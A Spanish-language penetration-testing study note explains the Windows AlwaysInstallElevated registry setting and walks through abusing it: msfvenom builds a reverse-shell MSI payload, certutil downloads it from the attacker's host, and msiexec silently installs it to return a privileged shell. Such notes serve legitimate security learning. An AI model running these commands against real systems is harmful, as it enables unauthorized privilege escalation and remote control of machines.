-----
- Tags: #windows #teoria #practica #escalada 
-----

# AlwaysInstallElevated

### El permiso **AlwaysInstallElevated** se refiere a una configuración de políticas de seguridad que afecta a la instalación de paquetes MSI (Windows Installer) y aplicaciones en sistemas operativos Windows. En resumen, permite a usuarios no administradores instalar paquetes MSI con privilegios elevados en Windows.

-------
# Explotación 

### En caso de que estemos con herramientas como [WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0) analizando vías potenciales de escalar privilegios y veamos que tenemos el permiso **AlwaysInstallElevated** seteado en **1** con **HKLM** y **HKCU** podríamos empezara pensar visitar recursos como [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) para abusar de esto e intentar escalar privilegios. 

#### NOTA: **HKLM** y **HKCU** son abreviaturas que se utilizar para referirse a dos de las principales subclaves en el Registro de Windows (Base de datos jerárquica en la que Windows y las aplicaciones almacenan configuraciones y datos importantes del sistema.)

- #### HKLM: Abreviatura de **HKEY_LOCAL_MACHINE**, esta subclave contiene configuraciones y datos relacionados con la configuración del sistema y el hardware. 
- #### HKCU: Abreviatura de **HKEY_CURRENT_USER**, esta subclave almacena las configuraciones y datos específicos de cada usuario que ha iniciado sesión en el equipo. 

### Una vez verificado que ambos permisos esten seteados en 1, podríamos comenzar con la explotación para escalar privilegios, en este caso lo primero que tendríamos que hacer es crear un payload con la herramienta **msfvenom**. 

```bash
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST={our_ip} LPORT={our_port} -f msi -o privesc.msi
```
### Una vez creado el payload deberíamos transferirlo a la máquina victima, esto podríamos hacerlo con un simple **certutil.exe**.

```shell
certutil.exe -f --urlcache -split http://{our_ip}/privesc.msi
```
### Una vez transferido el payload, solo quedaría abusar del privilegio **AlwasyInstallElevated** instalando el archivo malicioso **msi** creado.

```shell
msiexec /quiet /qn /i C:\{our}\{path}\privesc.msi
```
### Al momento de la ejecución de este último comando estaríamos instalando el archivo **msi** logrando que de manera privilegiada se ejecute el envío de una consola interactiva privilegiada al puerto y la ip especificada en el proceso de creación del payload con la herramienta **msfvenom**. 

